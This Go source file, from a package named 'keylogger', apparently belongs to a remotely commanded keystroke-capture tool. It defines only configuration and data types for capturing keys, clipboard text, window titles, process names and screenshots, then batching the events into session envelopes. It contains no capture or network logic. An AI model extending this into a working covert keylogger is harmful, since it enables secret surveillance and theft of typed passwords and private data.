package keylogger

import (
	"context"
	"time"
)

type Mode string

const (
	ModeStandard Mode = "standard"
	ModeOffline  Mode = "offline"
)

type StartConfig struct {
	Mode               Mode `json:"mode"`
	CadenceMs          int  `json:"cadenceMs,omitempty"`
	BatchIntervalMs    int  `json:"batchIntervalMs,omitempty"`
	BufferSize         int  `json:"bufferSize,omitempty"`
	IncludeWindowTitle bool `json:"includeWindowTitles,omitempty"`
	IncludeClipboard   bool `json:"includeClipboard,omitempty"`
	EmitProcessNames   bool `json:"emitProcessNames,omitempty"`
	IncludeScreenshots bool `json:"includeScreenshots,omitempty"`
	EncryptAtRest      bool `json:"encryptAtRest,omitempty"`
	RedactSecrets      bool `json:"redactSecrets,omitempty"`
}

func (c StartConfig) normalize() StartConfig {
	normalized := c
	switch normalized.Mode {
	case ModeOffline:
		// Ignore
	default:
		normalized.Mode = ModeStandard
	}
	if normalized.Mode == ModeStandard && normalized.CadenceMs <= 0 {
		normalized.CadenceMs = 250
	}
	if normalized.Mode == ModeOffline {
		if normalized.BatchIntervalMs <= 0 {
			normalized.BatchIntervalMs = int((15 * time.Minute).Milliseconds())
		}
		if normalized.BufferSize <= 0 {
			normalized.BufferSize = 5000
		}
	} else {
		if normalized.BufferSize <= 0 {
			normalized.BufferSize = 300
		}
	}
	if normalized.CadenceMs <= 0 {
		normalized.CadenceMs = 250
	}
	return normalized
}

type CommandPayload struct {
	Action    string       `json:"action"`
	SessionID string       `json:"sessionId,omitempty"`
	Mode      Mode         `json:"mode,omitempty"`
	Config    *StartConfig `json:"config,omitempty"`
}

type CaptureEvent struct {
	Timestamp     time.Time
	Key           string
	Text          string
	RawCode       string
	ScanCode      uint16
	Pressed       bool
	Alt           bool
	Ctrl          bool
	Shift         bool
	Meta          bool
	WindowTitle   string
	ProcessName   string
	ClipboardText string
}

type EventStream interface {
	Events() <-chan CaptureEvent
	Close() error
}

type Provider interface {
	Start(ctx context.Context, cfg StartConfig) (EventStream, error)
}

type Event struct {
	Sequence    uint64 `json:"sequence" msgpack:"sequence"`
	CapturedAt  string `json:"capturedAt" msgpack:"capturedAt"`
	Key         string `json:"key" msgpack:"key"`
	Text        string `json:"text,omitempty" msgpack:"text,omitempty"`
	RawCode     string `json:"rawCode,omitempty" msgpack:"rawCode,omitempty"`
	ScanCode    uint16 `json:"scanCode,omitempty" msgpack:"scanCode,omitempty"`
	Pressed     bool   `json:"pressed,omitempty" msgpack:"pressed,omitempty"`
	AltKey      bool   `json:"altKey,omitempty" msgpack:"altKey,omitempty"`
	CtrlKey     bool   `json:"ctrlKey,omitempty" msgpack:"ctrlKey,omitempty"`
	ShiftKey    bool   `json:"shiftKey,omitempty" msgpack:"shiftKey,omitempty"`
	MetaKey     bool   `json:"metaKey,omitempty" msgpack:"metaKey,omitempty"`
	WindowTitle string `json:"windowTitle,omitempty" msgpack:"windowTitle,omitempty"`
	ProcessName string `json:"processName,omitempty" msgpack:"processName,omitempty"`
	Clipboard   string `json:"clipboard,omitempty" msgpack:"clipboard,omitempty"`
}

type EventEnvelope struct {
	SessionID   string  `json:"sessionId" msgpack:"sessionId"`
	Mode        Mode    `json:"mode" msgpack:"mode"`
	CapturedAt  string  `json:"capturedAt" msgpack:"capturedAt"`
	Events      []Event `json:"events" msgpack:"events"`
	BatchID     string  `json:"batchId,omitempty" msgpack:"batchId,omitempty"`
	TotalEvents uint64  `json:"totalEvents,omitempty" msgpack:"totalEvents,omitempty"`
}
